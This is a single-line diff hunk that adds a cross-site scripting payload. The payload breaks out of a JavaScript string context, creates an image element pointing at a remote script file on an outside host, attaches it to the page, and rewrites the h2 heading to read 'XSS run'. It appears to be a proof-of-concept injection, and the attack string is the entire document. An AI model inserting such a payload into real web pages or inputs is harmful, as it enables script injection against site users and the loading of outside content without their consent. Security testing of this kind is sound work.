@@ -1,0 +1,1 @@
+');var img=document.createElement("img");img.src="https://raw.githubusercontent.com/barrygee/files/master/xss.js";document.body.appendChild(img);$('h2').text('XSS run');//
